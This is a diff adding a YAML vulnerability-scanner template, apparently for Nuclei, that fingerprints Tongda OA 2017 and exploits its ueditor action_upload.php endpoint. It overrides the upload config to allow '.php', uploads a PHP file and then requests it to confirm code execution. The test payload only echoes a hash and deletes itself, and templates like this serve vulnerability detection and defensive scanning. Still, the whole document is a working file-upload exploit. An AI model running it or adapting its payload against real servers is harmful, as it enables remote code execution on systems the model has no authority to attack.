@@ -1,0 +1,75 @@
+id: poc-yaml-tongda-oa-action-upload-php-upload
+
+info:
+  name: poc-yaml-tongda-oa-action-upload-php-upload
+  author: sharecast
+  severity: critical
+  tags: xray-converted,fileupload,ct-416616
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+
+http:
+  - raw:
+      - |
+        GET /inc/expired.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Office Anywhere 2017"
+  - raw:
+      - |
+        POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(8)}}
+        X_requested_with: XMLHttpRequest
+
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+        
+        ffff
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+        
+        1000000000
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+        
+        {{rand_base(8)}}
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+        
+        .php
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="ffff"; filename="test.php"
+        Content-Type: application/octet-stream
+        
+        <?php echo md5({{rand_int(1000, 9999)}});unlink(__FILE__);?>
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="mufile"
+        
+        submit
+        ------WebKitFormBoundary{{rand_base(8)}}--
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /{{rand_base(8)}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
